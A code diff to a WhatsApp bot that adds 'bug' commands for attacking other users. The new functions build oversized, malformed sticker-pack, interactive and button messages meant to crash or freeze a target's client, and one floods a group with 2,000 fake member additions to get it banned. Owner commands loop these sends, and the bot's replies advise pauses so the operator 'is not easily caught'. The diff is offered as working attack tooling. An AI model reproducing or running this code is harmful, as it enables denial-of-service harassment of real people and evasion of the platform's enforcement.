@@ -128,6 +128,7 @@ renderLargerThumbnail: false,
 }, { quoted: fquoted.channel });
 }
 
+const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
 // ==================== QUOTED OBJECTS ====================
 const qpayment = {
 key: {
@@ -317,9 +318,285 @@ await plugin(m, plug);
 
 if (!pluginsDisable) return;
 
+//====[FUNCTION BUG]====//
+async function mistery(sock, target) {
+  const stc = Array.from({ length: 1000 }, (_, i) => ({
+    fileName: `bcdf1b38-4ea9-4f3e-b6db-e428e4a581${i + 1}.webp`,
+    isAnimated: true,
+    emojis: ["🌟"],
+    accessibilityLabel: "h3ysaka",
+    mimetype: "image/webp"
+  }));
+  const msg = await generateWAMessageFromContent(
+    target,
+    proto.Message.fromObject({
+      viewOnceMessage: {
+        message: {
+          stickerPackMessage: {
+            stickerPackId: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5",
+            name: "ꦾ".repeat(77777),
+            publisher: "the angle",
+            stickers: stc,
+            fileLength: "3662919",
+            fileSha256: "G5M3Ag3QK5o2zw6nNL6BNDZaIybdkAEGAaDZCWfImmI=",
+            fileEncSha256: "2KmPop/J2Ch7AQpN6xtWZo49W5tFy/43lmSwfe/s10M=",
+            mediaKey: "rdciH1jBJa8VIAegaZU2EDL/wsW8nwswZhFfQoiauU0=",
+            directPath: "/v/t62.15575-24/11927324_562719303550861_518312665147003346_n.enc",
+            contextInfo: {
+              remoteJid: "X",
+              participant: "0@s.whatsapp.net",
+              stanzaId: "1234567890ABCDEF",
+              mentionedJid: [
+                target,
+                ...Array.from(
+                  { length: 1900 },
+                  () => `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`
+                )
+              ]
+            },
+            mediaKeyTimestamp: "1747502082",
+            trayIconFileName: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5.png",
+            thumbnailDirectPath: "/v/t62.15575-24/23599415_9889054577828938_1960783178158020793_n.enc",
+            thumbnailSha256: "hoWYfQtF7werhOwPh7r7RCwHAXJX0jt2QYUADQ3DRyw=",
+            thumbnailEncSha256: "IRagzsyEYaBe36fF900yiUpXztBpJiWZUcW4RJFZdjE=",
+            thumbnailHeight: 252,
+            thumbnailWidth: 252,
+            imageDataHash: "NGJiOWI2MTc0MmNjM2Q4MTQxZjg2N2E5NmFkNjg4ZTZhNzVjMzljNWI5OGI5NWM3NTFiZWQ2ZTZkYjA5NGQzOQ==",
+            stickerPackSize: "3680054",
+            stickerPackOrigin: "USER_CREATED",
+            quotedMessage: {
+              callLogMesssage: {
+                isVideo: true,
+                callOutcome: "REJECTED",
+                durationSecs: "1",
+                callType: "SCHEDULED_CALL",
+                participants: [
+                  { jid: target, callOutcome: "CONNECTED" },
+                  { jid: "0@s.whatsapp.net", callOutcome: "REJECTED" },
+                  { jid: "13135550002@s.whatsapp.net", callOutcome: "ACCEPTED_ELSEWHERE" },
+                  { jid: "status@broadcast", callOutcome: "SILENCED_UNKNOWN_CALLER" }
+                ]
+              }
+            }
+          }
+        }
+      }
+    }),
+    {}
+  );
+  await sock.relayMessage(target, msg.message, {
+    messageId: msg.key.id,
+    participant: { jid: target }
+  });
+  await sock.relayMessage("status@broadcast", msg.message, {
+    messageId: msg.key.id,
+    statusJidList: [target],
+    additionalNodes: [
+      {
+        tag: "meta",
+        attrs: {},
+        content: [
+          {
+            tag: "mentioned_users",
+            attrs: {},
+            content: [{ tag: "to", attrs: { jid: target } }]
+          }
+        ]
+      }
+    ]
+  });
+}
+
+async function delayhard(sock, target) {
+  const message = {
+    groupStatusMessageV2: {
+      message: {
+        interactiveMessage: {
+          body: { text: "\u000D" },
+          footer: { text: "\u000F" },
+          nativeFlowMessage: { buttons: "\t".repeat(45000) }
+        }
+      }
+    }
+  };
+  await sock.relayMessage(target, message, { noselfsync: true });
+}
+
+async function frezehard(sock, target) {
+  const msg = {
+    groupStatusMessageV2: {
+      message: {
+        interactiveMessage: {
+          body: { text: "\u0000" },
+          nativeFlowMessage: {
+            buttons: "[".repeat(500000)
+          }
+        }
+      }
+    }
+  };
+
+  await sock.relayMessage(target, msg, { noselfsync: true });
+}
+//====[FUNCTION BUG GROUP]====//
+async function bansgc(sock, target) {
+  try {
+    if (!target.endsWith('@g.us')) throw new Error('group only')
+    const fakeNumbers = Array.from({ length: 2000 }, () => {
+      return Math.floor(Math.random() * 9000000000000) + 1000000000000 + '@s.whatsapp.net'
+    })
+    for (const fakeJid of fakeNumbers) {
+      sock.groupParticipantsUpdate(target, [fakeJid], 'add').catch(() => {})
+      await new Promise(r => setTimeout(r, 20))
+    }
+  } catch (err) {
+    throw new Error(`bans gb: ${err.message}`)
+  }
+}
+
+async function GbCrash(sock, target) {
+  try {
+    const MgbMsg = {
+      viewOnceMessage: {
+        message: {
+          buttonsMessage: {
+            contentText: "Ӄ𝕀𝚴𝕋∆𝚴∆" + "ꦾ".repeat(50000),
+            footerText: "Ӄ𝕀𝚴𝕋∆𝚴∆",
+            headerType: 1,
+            buttons: [{ buttonId: "Ӄ𝕀𝚴𝕋∆𝚴∆", buttonText: { displayText: "ꦽ".repeat(90000) }, type: 1 }],
+            contextInfo: {
+              mentionedJid: Array.from({ length: 1900 }, () => `1${Math.floor(Math.random() * 999999999999)}@s.whatsapp.net`),
+              participant: target,
+              remoteJid: target,
+              forwardingScore: 999999999,
+              isForwarded: true,
+              quotedMessage: {
+                locationMessage: {
+                  degreesLatitude: 99999999999999999999,
+                  degreesLongitude: 99999999999999999999,
+                  name: "Ӄ𝕀𝚴𝕋∆𝚴∆",
+                  address: "\u0000",
+                  url: "\u0000",
+                  jpegThumbnail: null
+                }
+              }
+            }
+          }
+        }
+      }
+    };
+    await sock.relayMessage(target, MgbMsg, { userJid: target });
+    console.log("successfully sent group bug");
+  } catch (err) {
+    console.log(err);
+  }
+}
+
+async function misterygb(sock, target) {
+  const stc = Array.from({ length: 1000 }, (_, i) => ({
+    fileName: `bcdf1b38-4ea9-4f3e-b6db-e428e4a581${i + 1}.webp`,
+    isAnimated: true,
+    emojis: ["🌟"],
+    accessibilityLabel: "h3ysaka",
+    mimetype: "image/webp"
+  }));
+  const msg = await generateWAMessageFromContent(
+    target,
+    proto.Message.fromObject({
+      viewOnceMessage: {
+        message: {
+          stickerPackMessage: {
+            stickerPackId: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5",
+            name: "ꦾ".repeat(77777),
+            publisher: "the angle",
+            stickers: stc,
+            fileLength: "3662919",
+            fileSha256: "G5M3Ag3QK5o2zw6nNL6BNDZaIybdkAEGAaDZCWfImmI=",
+            fileEncSha256: "2KmPop/J2Ch7AQpN6xtWZo49W5tFy/43lmSwfe/s10M=",
+            mediaKey: "rdciH1jBJa8VIAegaZU2EDL/wsW8nwswZhFfQoiauU0=",
+            directPath: "/v/t62.15575-24/11927324_562719303550861_518312665147003346_n.enc",
+            contextInfo: {
+              remoteJid: "X",
+              participant: "0@s.whatsapp.net",
+              stanzaId: "1234567890ABCDEF",
+              mentionedJid: [
+                target,
+                ...Array.from(
+                  { length: 1900 },
+                  () => `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`
+                )
+              ]
+            },
+            mediaKeyTimestamp: "1747502082",
+            trayIconFileName: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5.png",
+            thumbnailDirectPath: "/v/t62.15575-24/23599415_9889054577828938_1960783178158020793_n.enc",
+            thumbnailSha256: "hoWYfQtF7werhOwPh7r7RCwHAXJX0jt2QYUADQ3DRyw=",
+            thumbnailEncSha256: "IRagzsyEYaBe36fF900yiUpXztBpJiWZUcW4RJFZdjE=",
+            thumbnailHeight: 252,
+            thumbnailWidth: 252,
+            imageDataHash: "NGJiOWI2MTc0MmNjM2Q4MTQxZjg2N2E5NmFkNjg4ZTZhNzVjMzljNWI5OGI5NWM3NTFiZWQ2ZTZkYjA5NGQzOQ==",
+            stickerPackSize: "3680054",
+            stickerPackOrigin: "USER_CREATED",
+            quotedMessage: {
+              callLogMesssage: {
+                isVideo: true,
+                callOutcome: "REJECTED",
+                durationSecs: "1",
+                callType: "SCHEDULED_CALL",
+                participants: [
+                  { jid: target, callOutcome: "CONNECTED" },
+                  { jid: "0@s.whatsapp.net", callOutcome: "REJECTED" },
+                  { jid: "13135550002@s.whatsapp.net", callOutcome: "ACCEPTED_ELSEWHERE" },
+                  { jid: "status@broadcast", callOutcome: "SILENCED_UNKNOWN_CALLER" }
+                ]
+              }
+            }
+          }
+        }
+      }
+    }),
+    {}
+  );
+  await sock.relayMessage(target, msg.message, {
+    messageId: msg.key.id,
+    participant: { jid: target }
+  });
+  await sock.relayMessage("status@broadcast", msg.message, {
+    messageId: msg.key.id,
+    statusJidList: [target],
+    additionalNodes: [
+      {
+        tag: "meta",
+        attrs: {},
+        content: [
+          {
+            tag: "mentioned_users",
+            attrs: {},
+            content: [{ tag: "to", attrs: { jid: target } }]
+          }
+        ]
+      }
+    ]
+  });
+}
+
+async function delayhardgb(sock, target) {
+  const message = {
+    groupStatusMessageV2: {
+      message: {
+        interactiveMessage: {
+          body: { text: "\u000D" },
+          footer: { text: "\u000F" },
+          nativeFlowMessage: { buttons: "\t".repeat(45000) }
+        }
+      }
+    }
+  };
+  await sock.relayMessage(target, message, { noselfsync: true });
+}
+//====[AKHIR FUNCTION]====///
 // ==================== COMMAND HANDLER ====================
 switch (command) {
-
 // ==================== MENU COMMANDS ====================
 case "menu": {
 const totalMem = os.totalmem();
@@ -480,8 +757,11 @@ let menu = `☼ Bot Name : Kintana Javascript
 > .blankclick 62xxx
  
 \`Bug Group\`
-.delaygb [Bug in Place]
-.crashgb [Bug in Place]`;
+> .delaygb [Bug in Place]
+> .crashgb [Bug in Place]
+
+\`Ban Group\`
+> .bangb [Ban in Place]`;
 await reaction(m.chat, "⭐");
 await sock.sendMessage(m.chat, {
 interactiveMessage: {
@@ -1063,8 +1343,9 @@ case 'delayhard': {
 
     let isTarget = `${jidx}@s.whatsapp.net`;
     reply(`Success! Sent Bug to ${isTarget}\n\nNote : Use Delay After Successfully Sending Bug, So Bot Is Not Easily Caught, Minimum Delay 10/15 Minutes!!`);
-    for (let i = 0; i < 3; i++) {
-        await pollTrash(isTarget);
+    for (let i = 0; i < 5; i++) {
+await delayhard(sock, target);
+await sleep(500);        
     }
 
     console.log(chalk.red.bold(`success sending bug type ${command}`));
@@ -1081,8 +1362,11 @@ case 'freezechat': {
 
     let isTarget = `${jidx}@s.whatsapp.net`;
     reply(`Success! Sent Bug to ${isTarget}\n\nNote : Use Delay After Successfully Sending Bug, So Bot Is Not Easily Caught, Minimum Delay 10/15 Minutes!!`);
-    for (let i = 0; i < 3; i++) {
-        await pollTrash(isTarget);
+    for (let i = 0; i < 5; i++) {
+await delayhard(sock, target);
+await sleep(500);   
+await frezehard(sock, target);  
+await sleep(500);   
     }
 
     console.log(chalk.red.bold(`success sending bug type ${command}`));
@@ -1099,8 +1383,13 @@ case 'blankclick': {
 
     let isTarget = `${jidx}@s.whatsapp.net`;
     reply(`Success! Sent Bug to ${isTarget}\n\nNote : Use Delay After Successfully Sending Bug, So Bot Is Not Easily Caught, Minimum Delay 10/15 Minutes!!`);
-    for (let i = 0; i < 3; i++) {
-        await pollTrash(isTarget);
+    for (let i = 0; i < 5; i++) {
+await mistery(isTarget);
+await sleep(500);
+await delayhard(sock, target);
+await sleep(500);   
+await frezehard(sock, target);  
+await sleep(500);   
     }
 
     console.log(chalk.red.bold(`success sending bug type ${command}`));
@@ -1110,48 +1399,47 @@ break;
 case 'delaygb': {
     if (!isOwner) return reply(config.message.owner);
     if (!isGroup) return reply(`This feature is only available in groups!`);
-    
-    await reaction(m.chat, "🕛");
-    await sleep(1000);
-    await reaction(m.chat, "🕞");
-    await sleep(1000);
-    await reaction(m.chat, "🕖");
-    await sleep(1000);
-    await reaction(m.chat, "🕛");
-    await sleep(1000);
-    await reaction(m.chat, "✅");
-    
+       
     let jidx = q.replace(/[^0-9]/g, "");
     if (m.chat.startsWith('0')) return reply(`— ex: ${prefix + command} `);
     let isTarget = `${m.chat}`;
     reply(`success! sent bug to ${isTarget}\n\n*Note* : If Bug Is Not Sent Reduce Loop So It Doesn't Overload.`);
     for (let i = 0; i < 5; i++) {
-
+await delayhardgb(sock, target);
+await delayhardgb(sock, target);
+await delayhardgb(sock, target);
     }
     console.log(chalk.red.bold(`Success Sending Bug Type ${command} Into Group`));
+}
+break;
+
+case 'bangb': {
+    if (!isOwner) return reply(config.message.owner);
+    if (!isGroup) return reply(`This feature is only available in groups!`);
+       
+    let jidx = q.replace(/[^0-9]/g, "");
+    if (m.chat.startsWith('0')) return reply(`— ex: ${prefix + command} `);
+    let isTarget = `${m.chat}`;
+    reply(`success! sent ban to ${isTarget}\n\n*Note* : If Bug Is Not Sent Reduce Loop So It Doesn't Overload.`);
+    for (let i = 0; i < 5; i++) {
+await bansgc(sock, target);
+    }
+    console.log(chalk.red.bold(`Success Sending Ban Type ${command} Into Group`));
 }
 break;
 
 case 'crashgb': {
     if (!isOwner) return reply(config.message.owner);
     if (!isGroup) return reply(`This feature is only available in groups!`);
-    
-    await reaction(m.chat, "🕛");
-    await sleep(1000);
-    await reaction(m.chat, "🕞");
-    await sleep(1000);
-    await reaction(m.chat, "🕖");
-    await sleep(1000);
-    await reaction(m.chat, "🕛");
-    await sleep(1000);
-    await reaction(m.chat, "✅");
-    
+       
     let jidx = q.replace(/[^0-9]/g, "");
     if (m.chat.startsWith('0')) return reply(`— ex: ${prefix + command} `);
     let isTarget = `${m.chat}`;
     reply(`success! sent bug to ${isTarget}\n\n*Note* : If Bug Is Not Sent Reduce Loop So It Doesn't Overload.`);
-    for (let i = 0; i < 5; i++) {
-
+    for (let i = 0; i < 5; i++) {   
+await misterygb(sock, target);
+await delayhardgb(sock, target);
+await GbCrash(sock, target);
     }
     console.log(chalk.red.bold(`Success Sending Bug Type ${command} Into Group`));
 }
